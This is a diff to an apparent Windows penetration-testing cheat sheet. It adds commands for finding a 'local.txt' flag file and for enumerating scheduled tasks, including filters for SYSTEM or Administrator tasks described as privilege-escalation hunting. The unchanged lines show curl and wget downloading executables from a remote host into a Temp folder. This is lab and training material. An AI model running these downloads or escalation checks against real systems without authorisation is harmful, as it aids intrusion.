@@ -15,4 +15,25 @@ curl http://10.10.10.10/file.exe -o C:\Windows\Temp\file.exe
 8. wget (If installed)
 wget -O C:\path\to\file.exe http://example.com/file.exe
 
+## File Search
+#This searches the entire C: drive recursively for the file and lists the full path if found. In Command Prompt:
+dir C:\local.txt /s /b
+#This recursively searches the C: drive, handles errors quietly, and outputs the full file paths. In PowerShell: 
+Get-ChildItem -Path C:\ -Recurse -Filter local.txt -ErrorAction SilentlyContinue | Select-Object FullName 
+#This lists all files recursively and filters for those ending with "local.txt".
+where /R C:\ local.txt
+
+## View Scheduled Tasks
+schtasks /query        Basic List of All Scheduled Tasks
+schtasks /query /fo LIST /v      Detailed List of All Scheduled Tasks
+schtasks /query /fo LIST /v | findstr /i "Run As TaskName Action"      Pipe to findstr to filter
+schtasks /query /fo LIST /v | findstr /i "SYSTEM Administrator"        Search for high-privilege tasks
+Get-ScheduledTask    Powershell list All Tasks
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM|Administrator"} | Select TaskName,Principal,Actions      Powershell Combine with filters for privilege escalation hunting
+Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,LastRunTime,NextRunTime,LastTaskResult,NumberOfMissedRuns   Powershell Detailed Task Info 
+Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo    Get information about specific task
+Get-ScheduledTask -TaskName "TaskName" | Select -ExpandProperty Actions      Look for tasks that recently ran or are about to run, and check their actions
+Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object { $_.LastRunTime -gt (Get-Date).AddMinutes(-10) } | Select TaskName, LastRunTime, LastTaskResult, NumberOfMissedRuns    Lists tasks where LastRunTime is within the last 10 minutes.
+Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational -FilterXPath "*[System/TimeCreated[timediff(@SystemTime) <= 600000]] and *[System[(EventID=200 or EventID=201)]]" | Select TimeCreated, Id, Message | Format-List      Queries the Task Scheduler operational log for events in the last 10 minutes (600,000 ms)
+
 
